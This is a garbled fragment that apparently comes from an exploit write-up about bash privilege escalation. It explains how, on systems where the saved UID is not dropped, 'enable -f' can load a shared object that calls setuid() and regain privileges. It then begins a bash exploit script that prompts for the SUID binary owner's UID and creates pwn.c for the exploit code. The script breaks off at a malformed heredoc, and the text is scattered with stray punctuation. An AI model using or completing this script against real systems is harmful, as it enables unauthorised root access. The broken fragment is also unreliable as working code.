On Linux and other systems that support \"saved UID\" functionality ,  ， the saved UID is not dropped. An attacker with command execution in the shell can use \"enable -f\" for ， runtime loading of a new builtin , which can be a shared object that calls setuid (  ) and therefore ， regains privileges. However , binaries running with an effective UID of 0 are unaffected. ，  #  ! /bin/bash ，  # Terminal Color Codes ， RED='\\033 [ 0 ; 31m' ， GREEN='\\033 [ 0 ; 32m' ， NC='\\033 [ 0m' ，  # Get the Effective User ID ( owner of the SUID /bin/bash binary )  ， read -p \"Please enter effective user id ( euid )  : \" euid ，  # Create a C file and output the exploit code ， touch pwn.c ， echo \" > pwn.c ， cat EOT pwn.c",
